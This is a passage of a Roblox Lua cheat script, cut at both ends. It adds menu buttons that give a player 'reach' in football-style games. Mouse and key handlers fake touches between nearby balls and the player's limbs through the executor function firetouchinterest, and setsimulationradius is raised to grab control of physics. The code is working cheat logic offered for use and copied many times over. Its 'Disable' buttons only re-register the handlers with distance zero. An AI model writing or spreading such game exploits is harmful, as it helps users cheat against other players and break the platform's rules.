firetouchinterest(ball, torso,  0)
firetouchinterest(ball, head, 0)
firetouchinterest(ball, arm, 0)
wait()
firetouchinterest(ball, leg, 1)
firetouchinterest(ball, leg2, 1)
firetouchinterest(ball, torso,  1)
firetouchinterest(ball, head, 1)
firetouchinterest(ball, arm, 1)
end
end
end
end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetChildren()) do
                            if balls:IsA("BasePart") or balls:IsA("Part") then
                                if balls.Size == Vector3.new(2.5,2.5,2.5) then
                            local ball = balls
                             if (ball.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(ball, leg, 0)
firetouchinterest(ball, leg2, 0)
firetouchinterest(ball, torso,  0)
firetouchinterest(ball, head, 0)
firetouchinterest(ball, arm, 0)
wait()
firetouchinterest(ball, leg, 1)
firetouchinterest(ball, leg2, 1)
firetouchinterest(ball, torso,  1)
firetouchinterest(ball, head, 1)
firetouchinterest(ball, arm, 1)
end
end
end
end
end
end)

setsimulationradius(math.huge, math.huge)

end)

----------

Section:NewButton("Disable", "ButtonInfo", function()
    print("Clicked")
local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

_G.Magnitude = 0
_G.Enabled = true -- Set this to false if you want to disable the script

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local leg2 = game.Players.LocalPlayer.Character["Left Leg"]
local LArm = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetChildren()) do
                            if balls:IsA("BasePart") or balls:IsA("Part") then
                                if balls.Size == Vector3.new(2.5,2.5,2.5) then
                            local ball = balls
                             if (ball.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(ball, leg, 0)
firetouchinterest(ball, leg2, 0)
firetouchinterest(ball, torso,  0)
firetouchinterest(ball, head, 0)
firetouchinterest(ball, arm, 0)
wait()
firetouchinterest(ball, leg, 1)
firetouchinterest(ball, leg2, 1)
firetouchinterest(ball, torso,  1)
firetouchinterest(ball, head, 1)
firetouchinterest(ball, arm, 1)
end
end
end
end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetChildren()) do
                            if balls:IsA("BasePart") or balls:IsA("Part") then
                                if balls.Size == Vector3.new(2.5,2.5,2.5) then
                            local ball = balls
                             if (ball.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(ball, leg, 0)
firetouchinterest(ball, leg2, 0)
firetouchinterest(ball, torso,  0)
firetouchinterest(ball, head, 0)
firetouchinterest(ball, arm, 0)
wait()
firetouchinterest(ball, leg, 1)
firetouchinterest(ball, leg2, 1)
firetouchinterest(ball, torso,  1)
firetouchinterest(ball, head, 1)
firetouchinterest(ball, arm, 1)
end
end
end
end
end
end)

setsimulationradius(math.huge, math.huge)

end)

-----------------------------------------------

local Section = Tab:NewSection("Fake PRS")
Section:NewButton("Enable", "ButtonInfo", function()
    print("Clicked")
_G.BallName = "MPS"
_G.Magnitude = 10
_G.Enabled = true


-- DONT TOUCH ANYTHING BELOW THIS

_G.Path = nil

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local left = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)


setsimulationradius(math.huge, math.huge)

end)

------------------------------------------------------------------------

Section:NewButton("Disable", "ButtonInfo", function()
    print("Clicked")
_G.BallName = "MPS"
_G.Magnitude = 0
_G.Enabled = true


-- DONT TOUCH ANYTHING BELOW THIS

_G.Path = nil

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local left = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)


setsimulationradius(math.huge, math.huge)

end)

-------------------------------------------------------------------------

------------------------------

local Section = Tab:NewSection("SRA")
Section:NewButton("Enable", "ButtonInfo", function()
    print("Clicked")
_G.BallName = "l̸̼̔il̷͎̅ḭ̴͘iḮ̷̙il̶̼̈́il̴̘̕Ĩ̵̹į̴̌"
_G.Magnitude = 6
_G.Enabled = true


-- DONT TOUCH ANYTHING BELOW THIS

_G.Path = nil

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local left = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)


setsimulationradius(math.huge, math.huge)

end)

------------------------------------------------------------------------

Section:NewButton("Disable", "ButtonInfo", function()
    print("Clicked")
_G.BallName = "l̸̼̔il̷͎̅ḭ̴͘iḮ̷̙il̶̼̈́il̴̘̕Ĩ̵̹į̴̌"
_G.Magnitude = 0
_G.Enabled = true


-- DONT TOUCH ANYTHING BELOW THIS

_G.Path = nil

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local left = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)


setsimulationradius(math.huge, math.huge)

end)

local Section = Tab:NewSection("MPS Match Pitch")
Section:NewButton("Enable", "ButtonInfo", function()
    print("Clicked")
_G.BallName = "MPS"
_G.Magnitude = 6
_G.Enabled = true


-- DONT TOUCH ANYTHING BELOW THIS

_G.Path = nil

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local left = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)


setsimulationradius(math.huge, math.huge)

end)

----------

------------------------------------------------------------------------

Section:NewButton("Disable", "ButtonInfo", function()
_G.BallName = "MPS"
_G.Magnitude = 0
_G.Enabled = true


-- DONT TOUCH ANYTHING BELOW THIS

_G.Path = nil

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local left = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)


setsimulationradius(math.huge, math.huge)

end)

--


local Section = Tab:NewSection("MPS Match Pitch Blatant")
Section:NewButton("Enable", "ButtonInfo", function()
    print("Clicked")
_G.BallName = "MPS"
_G.Magnitude = 50
_G.Enabled = true


-- DONT TOUCH ANYTHING BELOW THIS

_G.Path = nil

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local left = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)


setsimulationradius(math.huge, math.huge)

end)

----------

------------------------------------------------------------------------

Section:NewButton("Disable", "ButtonInfo", function()
_G.BallName = "MPS"
_G.Magnitude = 0
_G.Enabled = true


-- DONT TOUCH ANYTHING BELOW THIS

_G.Path = nil

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local left = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
